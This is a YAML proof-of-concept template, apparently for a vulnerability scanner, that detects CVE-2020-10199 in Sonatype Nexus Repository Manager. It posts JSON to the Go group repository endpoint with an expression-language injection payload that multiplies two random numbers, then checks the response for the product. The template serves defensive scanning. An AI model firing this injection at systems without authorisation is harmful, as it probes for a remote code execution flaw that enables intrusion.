name: yaml-poc-sonatype-nexus_repository_manager-other-CVE-2020-10199
binding: 1ed5b316-4648-40fd-9359-2ee414dac7bc
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/157261/Nexus-Repository-Manager-3.21.1-01-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/160835/Sonatype-Nexus-3.21.1-Remote-Code-Execution.html
        - http://www.nsfocus.net/vulndb/46317
        - https://cwe.mitre.org/data/definitions/917.html
        - https://cxsecurity.com/issue/WLB-2020040098
        - https://nvd.nist.gov/vuln/detail/CVE-2020-10199
        - https://packetstormsecurity.com/files/157261/Nexus-Repository-Manager-3.21.1-01-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/160835/Sonatype-Nexus-3.21.1-Remote-Code-Execution.html
        - https://support.sonatype.com/hc/en-us/articles/360044882533
        - https://vigilance.fr/vulnerability/Nexus-Repository-Manager-three-vulnerabilities-31920
        - https://www.exploit-db.com/exploits/48343
        - https://www.exploit-db.com/exploits/49385
    vulnerability:
        id: c2e79910-58e5-4121-a63b-1a0d5ea45f1c
        level: high
transport: http
set:
    r1: randomInt(40000, 44800)
    r2: randomInt(40000, 44800)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /rest/beta/repositories/go/group
            headers:
                Content-Type: application/json
            body: |
                {"name": "internal","online": true,"storage": {"blobStoreName": "default","strictContentTypeValidation": true},"group": {"memberNames": ["$\\c{ {{r1}} * {{r2}} }"]}}
        expression: response.status == 400 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0()
